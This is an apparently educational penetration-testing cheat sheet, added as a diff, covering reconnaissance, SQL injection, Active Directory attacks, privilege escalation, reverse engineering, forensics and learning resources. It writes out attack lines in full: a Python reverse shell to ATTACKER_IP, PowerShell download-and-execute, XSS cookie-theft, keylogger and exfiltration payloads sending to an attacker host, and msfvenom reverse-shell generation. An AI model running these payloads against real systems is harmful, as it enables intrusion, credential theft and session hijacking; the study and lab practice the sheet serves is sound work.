@@ -1,0 +1,381 @@
+
+🔴 PRINTABLE PENETRATION TESTING CHEAT SHEET 🔴
+⚡ NMAP — NETWORK RECONNAISSANCE
+
+
+Command	Purpose
+nmap -sC -sV -T4 <target>	Quick service + script scan
+nmap -p- -T4 <target>	All 65535 TCP ports
+nmap -sU --top-ports 20 <target>	Top 20 UDP ports
+nmap -A -T4 <target>	Aggressive (OS+svc+traceroute)
+nmap -sn 192.168.1.0/24	Ping sweep (host discovery)
+nmap --script vuln <target>	Vulnerability scan (NSE)
+nmap -sV --script=http-enum,http-headers -p 80,443 <tgt>	Web enum
+nmap --script smb-vuln* -p 445 <target>	SMB vuln check
+nmap -oA <basename> <target>	Save all output formats
+nmap -Pn -sS -sV -O <target>	Skip ping, SYN+ver+OS
+Flags: -sS=SYN stealth, -sT=TCP connect, -sC=default scripts, -O=OS detect, -Pn=no ping, -v=verbose, -T0..5=timing
+
+🌐 WEB ENUMERATION
+
+
+Command	Purpose
+ffuf -u http://tgt/FUZZ -w /usr/share/wordlists/dirb/common.txt	Directory fuzzing
+gobuster dir -u http://tgt -w /usr/share/dirbuster/...medium.txt	Directory brute
+gobuster dns -d domain.com -w /usr/share/wordlists/.../subdomains.txt	Subdomain enum
+wfuzz -c -z file,params.txt -u "http://tgt/page.php?FUZZ=test"	Parameter fuzzing
+nikto -h http://target	Web server scanner
+whatweb http://target	CMS/tech detection
+curl -s http://tgt | grep -oP 'href="[^"]*"' | cut -d'"' -f2	Extract all links
+🗃️ SQL INJECTION (sqlmap)
+
+
+
+sqlmap -u "http://tgt/page?id=1" --batch --dbs              # List databases
+sqlmap -u "http://tgt/page?id=1" -D db --tables              # List tables
+sqlmap -u "http://tgt/page?id=1" -D db -T users --dump       # Dump table
+sqlmap -u "http://tgt/page?id=1" --os-shell                  # OS shell
+sqlmap -r request.txt -p id --level 5 --risk 3               # Deep scan
+Types: Error-based, Union-based, Blind (boolean/time), Stacked queries
+
+🏢 ACTIVE DIRECTORY ATTACKS
+
+
+
+# LLMNR/NBT-NS Poisoning
+sudo responder -I eth0 -w -f
+
+# NTLMv2 Cracking
+hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
+
+# Kerberoasting
+impacket-GetUserSPNs -dc-ip <DC_IP> domain/user:pass -request
+
+# AS-REP Roasting
+impacket-GetNPUsers domain/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat
+
+# DCSync (Domain Admin)
+impacket-secretsdump domain/admin:pass@<DC_IP>
+
+# CrackMapExec
+crackmapexec smb <tgt> -u user -p pass --shares
+crackmapexec smb <tgt> -u user -p pass --sam
+crackmapexec smb <tgt> -u user -p pass --ntds
+crackmapexec smb <tgt> -u user -p pass -x "whoami"        # Remote exec
+crackmapexec smb <tgt> -u user -H <hash> --local-auth      # Pass-the-hash
+
+# BloodHound
+SharpHound.exe -c All                           # Collect data (on target)
+Upload JSON files → BloodHound GUI
+MATCH p=(n)-[r:MemberOf*1..]->(m:Group) RETURN p    # Cypher query
+MATCH p=(m:Computer)-[r:HasSession*1..]->(n) RETURN p
+🔼 PRIVILEGE ESCALATION — LINUX
+
+
+Command	What it finds
+find / -perm -4000 2>/dev/null	SUID binaries
+sudo -l	Sudo permissions
+cat /etc/crontab; ls -la /etc/cron*	Cron jobs
+uname -a	Kernel version (exploit suggester)
+getcap -r / 2>/dev/null	Linux capabilities
+find / -writable -type f 2>/dev/null	Writable files
+cat /etc/passwd | grep -v nologin|false	Users with shells
+ls -la /etc/passwd /etc/shadow	Writable password files
+netstat -tlnp	Listening services
+cat /etc/ssh/sshd_config | grep PermitRootLogin	Root SSH access
+./linpeas.sh	Automated enum (run this first!)
+🔼 PRIVILEGE ESCALATION — WINDOWS
+
+
+Command	What it finds
+whoami /priv	Current privileges
+whoami /groups	Group memberships
+systeminfo	System info + missing patches
+wmic qfe get Caption,Description,HotFixID	Installed patches
+net localgroup administrators	Admin group
+net user <user>	User details
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall	Installed software
+tasklist /svc	Running services
+winPEAS.exe	Automated enum
+PowerUp.ps1; Invoke-AllChecks	PowerShell automated
+🧠 REVERSE ENGINEERING — GHIDRA SHORTCUTS
+
+
+Key	Action	Key	Action
+F	Create function	U	Undo disassembly
+D	Disassemble	C	Clear + create code
+Ctrl+Shift+G	Create structure	P	Create pointer
+Ctrl+F	Find/Search	Ctrl+Shift+F	Find strings
+Ctrl+D	Toggle decompiler	Ctrl+H	Find/Replace
+Enter	Follow reference	Esc	Return from reference
+N	Rename symbol	;	Add comment
+L	Change label	G	Go to address
+I	Edit function signature	Ctrl+E	Export
+Workflow: Import binary → Auto-analyze → Find main() → Decompile (F5/Ctrl+D) → Rename variables (N) → Follow function calls (Enter) → Document (;)
+
+🔧 x64dbg SHORTCUTS
+
+
+Key	Action	Key	Action
+F2	Toggle breakpoint	F7	Step into
+F8	Step over	F9	Run
+Ctrl+F2	Restart	Ctrl+G	Go to address
+Ctrl+B	Search for binary pattern	Ctrl+F	Find string
+Space	Assemble (patch)	F6	Switch CPU thread
+Alt+E	Module list	Alt+B	Breakpoints tab
+Techniques: Set BP at GetWindowTextA → Find password comparison → NOP out JNZ → Patch binary
+
+💾 MEMORY FORENSICS (Volatility 3)
+
+
+
+vol -f memory.dump windows.info                    # Image info
+vol -f memory.dump windows.pslist                  # Process list
+vol -f memory.dump windows.psscan                  # Hidden processes
+vol -f memory.dump windows.netscan                 # Network connections
+vol -f memory.dump windows.cmdline                 # Command lines
+vol -f memory.dump windows.malfind                 # Code injection detection
+vol -f memory.dump windows.hashdump                # Dump NTLM hashes
+vol -f memory.dump windows.dumpfiles --virtaddr X  # Dump process mem
+vol -f memory.dump windows.registry.printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"
+vol -f memory.dump windows.psxview                # Cross-view hidden proc
+vol -f memory.dump windows.handles                 # Open handles
+🌐 NETWORK FORENSICS (Wireshark/tshark)
+
+
+
+tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
+tshark -r capture.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u
+tshark -r capture.pcap -Y "tcp.port==443" -T fields -e ip.src -e ip.dst | sort | uniq -c
+tshark -r capture.pcap -Y "http.response.code==200" -T fields -e http.content_type
+tshark -r capture.pcap --export-objects http,/output/dir   # Extract files
+tshark -r capture.pcap -Y "frame contains "password""     # Search string
+Wireshark filters: http.request, tcp.port==80, ip.addr==192.168.1.1, dns.qry.type==1, !arp, frame contains "secret"
+
+💻 BASH — ONE-LINERS
+bash
+
+
+
+# Ping sweep
+for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip | grep "64 bytes" | cut -d" " -f4 | tr -d ":"; done
+
+# Extract all URLs from page
+curl -s http://target | grep -oP 'href="[^"]*"' | cut -d'"' -f2
+
+# crt.sh subdomain enum
+curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Monitor connections
+watch -n 1 "ss -tupn | grep ESTAB"
+
+# DNS resolver
+while read d; do echo "$d -> $(dig +short $d)"; done < domains.txt
+
+# HTTP response headers
+curl -sI http://target | grep -i "server\|x-powered\|location"
+
+# Find open ports (netcat)
+for p in $(seq 1 1024); do nc -zv -w1 target $p 2>&1 | grep open; done
+🐍 PYTHON — ONE-LINERS
+python
+
+
+
+# Port scanner
+python3 -c "import socket; [print(f'{p}: open') if socket.socket().connect_ex(('tgt',p))==0 else None for p in range(1,1001)]"
+
+# Reverse shell PTY
+python3 -c "import pty; pty.spawn(['/bin/bash'])"
+
+# URL decode
+python3 -c "import urllib.parse; print(urllib.parse.unquote('%68%65%6C%6C%6F'))"
+
+# Base64 decode
+python3 -c "import base64; print(base64.b64decode('dGVzdA==').decode())"
+
+# HTTP server (file xfer)
+python3 -m http.server 8080
+
+# XOR decode
+python3 -c "print(''.join(chr(ord(c)^0x23) for c in 'encrypted'))"
+
+# Simple reverse shell
+python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('ATTACKER_IP',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
+
+# Hex to ASCII
+python3 -c "import binascii; print(binascii.unhexlify('48656C6C6F').decode())"
+
+# Subdomain resolver
+python3 -c "import socket; [print(f'{d}: {socket.gethostbyname(d)}') for d in open('domains.txt').read().splitlines()]"
+💻 POWERSHELL — ONE-LINERS
+powershell
+
+
+
+# Download file
+Invoke-WebRequest -Uri "http://attacker/payload.exe" -OutFile "C:\temp\p.exe"
+
+# Bypass EP + remote load
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
+
+# Port scan 1-1024
+1..1024 | % {$s=New-Object Net.Sockets.TcpClient; $r=$s.BeginConnect("target",$_,$null,$null); if($r.AsyncWaitHandle.WaitOne(100,$false)){"$_ open"}; $s.Close()}
+
+# List domain admins
+Get-ADGroupMember "Domain Admins" | Select Name, SamAccountName
+
+# All users with SPNs (Kerberoast targets)
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+# Enumerate shares
+Get-SmbShare
+
+# Check admin
+([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+🔵 JAVASCRIPT / XSS PAYLOADS
+javascript
+
+
+
+// Cookie theft
+<script>fetch('http://attacker/steal?c='+document.cookie)</script>
+
+// Keylogger
+<script>document.onkeypress=function(e){fetch('http://attacker/k?k='+e.key)}</script>
+
+// HTML exfiltration
+<script>fetch('http://attacker/exfil?html='+btoa(document.body.innerHTML))</script>
+
+// BeEF hook
+<script src="http://attacker:3000/hook.js"></script>
+
+// Session hijack
+<script>new Image().src='http://attacker/steal?c='+document.cookie</script>
+
+// DOM-based XSS
+#"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+🔴 RUBY — METASPLOIT MODULE SKELETON
+ruby
+
+
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+  def initialize(info = {})
+    super(update_info(info,
+      'Name' => 'Module Name',
+      'Description' => 'Description',
+      'Targets' => [['Automatic', {}]],
+      'DefaultTarget' => 0))
+  end
+  def exploit
+    send_request_cgi('uri' => target_uri.path)
+  end
+end
+⚙️ C — EXPLOIT DEV BASICS
+c
+
+
+
+// Vulnerable pattern
+void vuln() { char buf[64]; gets(buf); }
+
+// In GDB:
+// pattern create 200       → generate pattern
+// pattern offset <value>   → find EIP offset
+// Find JMP ESP: !mona jmp -r esp
+// Final: [padding][EIP_ret][NOP_sled][shellcode]
+
+// Shellcode generation
+msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y -f c -b "\x00"
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=X LPORT=Y -f c -b "\x00"
+🧰 msfvenom — PAYLOAD GENERATION
+
+
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=X LPORT=Y -f elf -o shell.elf
+msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y -f exe -o shell.exe
+msfvenom -p php/reverse_php LHOST=X LPORT=Y -f raw -o shell.php
+msfvenom -p python/shell_reverse_tcp LHOST=X LPORT=Y -f raw
+msfvenom -p windows/x64/exec CMD="cmd.exe /c powershell -ep bypass IEX(...)" -f exe
+msfvenom -p windows/shell_reverse_tcp LHOST=X LPORT=Y -f c -b "\x00\x0a\x0d"  # bad chars
+🎯 TOOL QUICK REFERENCE
+
+
+Tool	Purpose
+Responder	LLMNR/NBT-NS/mDNS poisoning
+Hashcat	GPU password cracking (-m 5600=NTLMv2, -m 1000=NTLM, -m 13100=krb5tgs)
+Hydra	Online brute-force
+John	CPU password cracking
+LinPEAS/WinPEAS	Automated privesc enumeration
+Impacket	AD toolkit (psexec, secretsdump, GetUserSPNs, etc.)
+Metasploit	Exploitation framework (msfconsole)
+Searchsploit	Offline Exploit-DB search
+Netcat	Listener nc -lvnp 4444 / Connect nc tgt 4444
+Socat	Advanced relay/listener
+Burp Suite	Web proxy + repeater + intruder
+Wireshark	Packet analyzer
+Volatility 3	Memory forensics
+Ghidra	Reverse engineering/decompiler
+x64dbg	Windows debugger
+IDA Pro	Disassembler/decompiler
+📌 CRITICAL COMMANDS
+
+
+
+# Reverse shell listener
+nc -lvnp 4444
+
+# Full TTY (Linux)
+python3 -c "import pty; pty.spawn(['/bin/bash'])"
+Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm
+
+# File transfer
+python3 -m http.server 8080                              # Host
+wget http://attacker:8080/file                           # Download
+certutil -urlcache -f http://attacker/file C:\temp\file  # Windows download
+
+# Encryption
+openssl enc -aes-256-cbc -salt -in file -out file.enc    # Encrypt
+openssl enc -aes-256-cbc -d -in file.enc -out file       # Decrypt
+
+# Generate password wordlist
+crunch 8 12 abcdef123!@# -o wordlist.txt
+💡 PRACTICE PLATFORMS
+
+
+Platform	URL	Focus
+HackTheBox	hackthebox.com	Labs + machines
+TryHackMe	tryhackme.com	Guided learning
+PortSwigger Academy	portswigger.net/web-security	Web vulns (BEST)
+PentesterLab	pentesterlab.com	Web challenges
+VulnHub	vulnhub.com	Downloadable VMs
+OffSec Proving Grounds	offsec.com/labs	OSCP practice
+Crackmes.one	crackmes.one	RE challenges
+PicoCTF	picoctf.com	CTF for beginners
+Root Me	root-me.org	Multi-challenge
+DFIR Madness	dfirmadness.com	Forensics dumps
+📺 BEST YOUTUBE CHANNELS
+
+
+Channel	Sub	Best For
+TCM Security	@TCMSecurityAcademy	Full pentesting courses
+IppSec	@IppSec	HTB walkthroughs
+HackerSploit	@HackerSploit	Burp, privesc, malware
+John Hammond	@_JohnHammond	Malware, CTFs, forensics
+Tib3rius	@Tib3rius	Linux/Windows privesc
+Prabh Nair	@PrabhNair	AD pentesting masterclasses
+OALabs	@OALabs	Advanced Ghidra, RE
+LiveOverflow	@LiveOverflow	Binary exploitation
+NetworkChuck	@NetworkChuck	Linux basics, motivation
+BlackMage	@BIackMage	Ghidra & IDA beginner RE
+LaceySnr	@LaceySnr	x64dbg, cracking, RE
+STÖK	@STOKfredrik	Bug bounty, JavaScript
+7Sec	@7Sec	Forensics, Volatility
+Josh Stroschein (Cyber Yeti)	@jstrosch	Malware analysis
+SANS DFIR	@SANSDFIR	Forensics, IR
+END OF CHEAT SHEET
